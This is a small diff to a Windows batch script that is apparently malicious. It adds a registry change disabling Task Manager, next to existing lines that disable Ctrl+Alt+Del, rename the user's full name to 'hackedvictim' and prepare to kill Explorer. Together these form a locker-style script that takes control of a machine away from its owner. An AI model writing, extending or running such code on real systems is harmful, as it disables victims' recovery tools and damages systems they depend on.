@@ -4,6 +4,7 @@
 
 :: setup registry keys before killing explorer
 reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCAD /t REG_DWORD /d 1
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1
 cls
 :: set username secretly (not really) and before killing explorer
 wmic useraccount where name='%username%' set FullName='hackedvictim'
